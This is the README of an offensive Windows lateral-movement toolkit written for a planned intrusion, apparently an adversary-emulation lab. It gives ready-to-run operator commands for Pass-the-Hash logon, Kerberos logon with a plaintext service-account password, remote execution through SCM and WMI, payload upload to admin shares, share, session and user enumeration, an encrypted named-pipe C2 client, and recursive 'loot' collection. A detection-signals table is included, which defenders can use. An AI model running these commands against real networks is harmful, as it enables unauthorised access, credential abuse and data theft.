# go-thehash

**Purpose:** SMB/WMI lateral-movement toolkit for the q3-plan intrusion. Default mode is Pass-the-Hash (`T1550.002`); the `-krb` mode logs on with a valid domain password (`T1078.002`), and the `collect` subcommand performs criteria-based automated collection (`T1119`).

## Overview

A single static Windows binary (no PowerShell, no Windows SSPI). It authenticates an SMB2 session to a target over tcp/445 and exposes file transfer, remote execution, share/session/user enumeration, an encrypted named-pipe C2 channel, and recursive collection.

Two authentication modes:
- **Pass-the-Hash (default)** — NTLMv2 from a raw NT hash. Live in Phase 4 for lateral movement to DC01.
- **Kerberos (`-krb`)** — a plaintext domain password is turned into an AS-REQ/TGS-REQ. This is real Kerberos logon, so the DC records `4768`/`4769` and the target records a Kerberos `4624`, giving a detection signal distinct from Pass-the-Hash. Used in Phase 2 to exercise the `svc_app_dev` domain account.

**ATT&CK:** T1550.002 · T1078.002 · T1119 · T1021.002 · T1569.002 · T1047 · T1135 · T1049 · T1087.001 · T1083

---

## Global flags

Flags precede the subcommand and may appear in any order.

| Flag | Description |
|---|---|
| `-o <file>` | Redirect stdout to `<file>` (stderr unchanged). For `sp_OA` Run callers that read the file back afterward. |
| `-krb` | Authenticate with Kerberos using a plaintext domain password (`T1078.002`) instead of NTLM Pass-the-Hash. `credential` must be the password and `target` must be a **hostname**, not an IP. |
| `-dcip <ip>` | Optional KDC IP for `-krb`; defaults to discovering the DC via DNS SRV for the realm. Recommended in the lab (DC01 `10.12.10.10`). |

> Build instructions live in [`Build.md`](Build.md).

---

## Subcommands

### File transfer

```
go-thehash put  <target> <domain> <user> <credential> <share> <remote-path> <local-path>
go-thehash get  <target> <domain> <user> <credential> <share> <remote-path> <local-path>
go-thehash del  <target> <domain> <user> <credential> <share> <remote-path>
go-thehash ls   <target> <domain> <user> <credential> <share> <remote-dir> [pattern]
```

### Collection

```
go-thehash collect <target> <domain> <user> <credential> <share> <remote-dir> <local-dir> [pattern]
```

Recursively enumerates `<remote-dir>`, selects files whose name matches `pattern` (comma-separated, case-insensitive globs such as `*.config,*.json`; default `*`), and copies each match into `<local-dir>`, recreating the remote directory tree. Criteria-based and recursive — this is the `T1119` behavior, distinct from a single-file `get`.

> `collect` enumerates with `*` and filters client-side: passing a narrow server-side glob would prevent recursion, since directory names would never match it.

### Remote execution

```
go-thehash exec     <target> <domain> <user> <credential> <command>
go-thehash exec-wmi <target> <domain> <user> <credential> <command>   # NTLM only (no -krb)
```

| | `exec` (MS-SCMR) | `exec-wmi` (DCOM/WMI) |
|---|---|---|
| Transport | SMB2 `IPC$\svcctl` named pipe | TCP port 135 + dynamic RPC port |
| Artefact | Event ID 7045 (SCM service install) | Event ID 4688 (process create via WMI) |
| Timing | 30 s SCM timeout expected — a short command finishes before SCM terminates the service process | Returns immediately |
| Long-running payload | **Killed** at the ~30 s timeout (SCM terminates the service process) — use `exec-wmi` | Survives |
| Requires | Port 445 | Port 135 + dynamic RPC range open |

> **`exec` note:** `command` must be an absolute binary path, or wrap shell built-ins explicitly:
> `"%COMSPEC% /c whoami > C:\Windows\Temp\out.txt"` — double-escape `%` when calling from a shell prompt.
>
> **Long-running payloads:** `exec` is for commands that complete within the SCM start timeout. SCM terminates the service process at ~30 s when the binary never reports `SERVICE_RUNNING`, so a persistent agent/listener started as the service `ImagePath` is killed. Use `exec-wmi` for those (see `smbpipe-agent/README.md`).

### Enumeration

```
go-thehash enum shares   <target> <domain> <user> <credential>
go-thehash enum sessions <target> <domain> <user> <credential>
go-thehash enum users    <target> <domain> <user> <credential> [netbios-name]
```

### Named-pipe command execution

```
go-thehash pipe <target> <domain> <user> <credential> <pipe-name> <command>
```

Operator-side client for `smbpipe-agent.exe` ([`../smbpipe-agent/`](../smbpipe-agent/)): opens the remote named pipe over `IPC$`, performs the encrypted-channel handshake (16-byte salt → static X25519 ECDH + HKDF-SHA256 → per-connection AES-256-GCM keys), sends one command, prints the framed output. Retries up to 2 s when the server reports `STATUS_PIPE_BUSY`. The agent must already be listening on the target.

| | notes |
|---|---|
| Transport | SMB2 `IPC$` named pipe (tcp/445) — rides inside an ordinary SMB session |
| Artefact | No service install, no new process creation primitive beyond what the command itself runs |
| Requires | Port 445; local admin on target (agent DACL allows BA/SY only) |

Implementation notes:
- Byte-mode pipe with length-prefix framing, not `FSCTL_PIPE_TRANSCEIVE` — that IOCTL requires a message-mode server pipe, and separate `WriteFile` + `ReadFile` is correct against the byte-mode agent.
- SMB2 `ReadFile` on a named pipe ignores the offset parameter (data comes from the pipe buffer sequentially); passing `0` is correct.

---

## Arguments

| Argument | Description |
|---|---|
| `target` | Hostname (required with `-krb`) or IP/hostname of the remote Windows machine |
| `domain` | Windows domain name; use `.` for local accounts. With `-krb` this is the **Kerberos realm** (the DNS domain, e.g. `TESTLAB.LOCAL`); a short NetBIOS name (`TESTLAB`) is accepted and the realm is derived from the `<target>` FQDN suffix. |
| `user` | Username (e.g. `Administrator`) |
| `credential` | NTLM mode: 32-character hex NT hash, no `0x` prefix (`T1550.002`). `-krb` mode: plaintext domain password (`T1078.002`). |
| `share` | SMB share name for file ops (e.g. `ADMIN$`, `C$`) |
| `remote-path` | Path inside the share (e.g. `Temp\payload.exe`) |
| `remote-dir` | Directory inside the share to list or `collect` |
| `pattern` | File glob for `ls`; comma-separated globs for `collect` (default `*`, case-insensitive) |
| `local-path` | Local file path for `put` / `get` |
| `local-dir` | Local destination directory for `collect` (remote tree is preserved) |
| `command` | Full command string for `exec` / `exec-wmi` |
| `pipe-name` | Named pipe name without the `\\.\pipe\` prefix (e.g. `oraclexa`) — must match the agent's pipe |
| `netbios-name` | NetBIOS computer name for `enum users`; auto-detected if omitted |

---

## Examples

```text
# Upload a file to the remote host
go-thehash.exe put  TARGET . Administrator aad3b435b51404eeaad3b435b51404ee ADMIN$ Temp\payload.exe .\payload.exe

# Download a file from the remote host
go-thehash.exe get  TARGET . Administrator aad3b435b51404eeaad3b435b51404ee C$ Windows\Temp\out.txt .\out.txt

# Delete a remote file
go-thehash.exe del  TARGET . Administrator aad3b435b51404eeaad3b435b51404ee C$ Windows\Temp\out.txt

# List a remote directory
go-thehash.exe ls   TARGET . Administrator aad3b435b51404eeaad3b435b51404ee C$ Windows\Temp *.exe

# Execute a command via Windows Service Manager (leaves Event ID 7045)
go-thehash.exe exec TARGET . Administrator aad3b435b51404eeaad3b435b51404ee "%COMSPEC% /c whoami > C:\Windows\Temp\out.txt"

# Execute a command via WMI (no service artefact)
go-thehash.exe exec-wmi TARGET . Administrator aad3b435b51404eeaad3b435b51404ee "cmd.exe /c whoami > C:\Windows\Temp\out.txt"

# Execute a command through the encrypted pipe channel (smbpipe-agent must be listening on TARGET)
go-thehash.exe pipe TARGET . Administrator aad3b435b51404eeaad3b435b51404ee oraclexa "whoami"

# Enumerate shares
go-thehash.exe enum shares   TARGET DOMAIN Administrator aad3b435b51404eeaad3b435b51404ee

# Enumerate active SMB sessions
go-thehash.exe enum sessions TARGET DOMAIN Administrator aad3b435b51404eeaad3b435b51404ee

# Enumerate local users (NetBIOS name auto-detected)
go-thehash.exe enum users    TARGET DOMAIN Administrator aad3b435b51404eeaad3b435b51404ee

# --- Kerberos valid-account logon (T1078.002): password + hostname target ---

# List a share as a valid domain account over Kerberos
go-thehash.exe -krb -dcip 10.12.10.10 ls      iis01.testlab.local TESTLAB.LOCAL svc_app_dev "D3vPortal!2025" DevPortal .

# Collect config/JSON files recursively over Kerberos (T1119)
go-thehash.exe -krb -dcip 10.12.10.10 collect iis01.testlab.local TESTLAB.LOCAL svc_app_dev "D3vPortal!2025" DevPortal . .\loot "*.config,*.json"

# Pin the KDC explicitly
go-thehash.exe -krb -dcip 10.12.10.10 get iis01.testlab.local TESTLAB.LOCAL svc_app_dev "D3vPortal!2025" DevPortal appsettings.json .\appsettings.json
```

---

## Detection signals

| Event | Notes |
|---|---|
| Event ID 4624 (Logon Type 3, NTLM) | Default Pass-the-Hash mode — NTLM logon on the target, no Kerberos tickets |
| Event ID 4624 (Kerberos) + 4768 + 4769 | `-krb` mode — AS-REQ/TGS-REQ on the DC and a Kerberos logon on the target; the distinct `T1078.002` signal |
| Event ID 7045 (Service install) | `exec` only — random 12-char service name, deleted immediately after launch |
| SMB2 `TreeConnect` to admin share | Visible in network capture for file transfer subcommands |
| Recursive enumeration + burst of `ReadFile`/local writes | `collect` — many `FIND`/`ReadFile` on one share, then files written under `local-dir` (automated collection) |
| SMB2 `IPC$\svcctl` DCE/RPC | Visible in network capture for `exec` |
| SMB2 pipe open + read/write on custom pipe name | `pipe` subcommand — traffic is encrypted after handshake; only the salt and frame lengths are visible on the wire |

---

## Source layout

```
go-thehash/
├── main.go                    ← CLI dispatch only (usage + switch)
├── internal/
│   ├── session/               ← SMB2 session setup — PtH (NTLMv2) or Kerberos (-krb)
│   ├── fileops/               ← put / get / del / ls / collect
│   ├── remoteexec/            ← exec (MS-SCMR) / exec-wmi (DCOM)
│   ├── pipechan/              ← pipe subcommand: encrypted channel client (mirror of smbpipe-agent internal/securechan)
│   └── enum/                  ← enum shares / sessions / users (MS-SRVS, MS-SAMR)
├── go.mod                     ← module declaration, go 1.24, replace → ./go-smb
├── go.sum
└── go-smb/                    ← jfjallid/go-smb vendored locally
```

> `internal/pipechan` duplicates the wire protocol implemented in `../smbpipe-agent/internal/securechan/`. A frame-layout change must be applied to both modules in the same change — see the "Mirror drift" section of the agent README for the incident that motivates this rule.

---

## Comparison with Invoke-TheHash

| Function | Invoke-TheHash | go-thehash |
|---|---|---|
| SMB execution (SCM) | `Invoke-SMBExec` | `exec` |
| WMI execution | `Invoke-WMIExec` | `exec-wmi` |
| File upload | `Invoke-SMBClient -Action Put` | `put` |
| File download | `Invoke-SMBClient -Action Get` | `get` |
| File delete | `Invoke-SMBClient -Action Delete` | `del` |
| Directory listing | `Invoke-SMBClient -Action List` | `ls` |
| Recursive criteria collection | — (no counterpart) | `collect` |
| Share enumeration | `Invoke-SMBEnum -Action Share` | `enum shares` |
| Session enumeration | `Invoke-SMBEnum -Action NetSession` | `enum sessions` |
| User enumeration | `Invoke-SMBEnum -Action User` | `enum users` |
| Named-pipe C2 client | — (no counterpart) | `pipe` |
| SMB versions | SMB1 + SMB2.1 | SMB2 only |
| Hash input format | `LM:NTLM` or `NTLM` (32/65 chars) | NT hash, 32-char hex only (or a password with `-krb`) |
